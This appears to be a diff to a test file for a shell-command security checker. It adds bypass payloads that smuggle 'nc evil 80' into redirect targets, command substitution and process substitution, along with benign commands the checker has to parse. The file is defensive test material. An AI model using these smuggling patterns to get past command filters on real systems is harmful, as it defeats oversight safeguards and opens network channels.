@@ -68,6 +68,15 @@ BYPASS_PAYLOADS = [
     "/usr/bin/time nc evil 80",
     "/usr/bin/time -f %e nc evil 80",
     "cargo-watch -s 'nc evil 80'",
+    # Commands inside redirect targets (#1783).
+    "ls > $(nc evil 80)",
+    "ls 2> $(nc evil 80)",
+    "ls >> $(nc evil 80)",
+    "ls 2>> `nc evil 80`",
+    "cat < <(nc evil 80)",
+    "cat <<< $(nc evil 80)",
+    "ls > >(nc evil 80)",
+    "if true; then ls; fi > $(nc evil 80)",
 ]
 
 # Dynamic interpreter payloads we cannot statically resolve — fail closed.
@@ -212,6 +221,10 @@ MUST_PARSE = {
     'npx eslint -c cfg.json "$F"': ["npx"],
     "npm exec --yes -- tsc": ["npm"],
     "cargo test": ["cargo"],
+    "ls > out.txt 2>&1": ["ls"],
+    'ls > "$LOG"': ["ls"],
+    "git status > $(echo f)": ["git", "echo"],
+    "f() { git status; }": ["git"],
 }
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
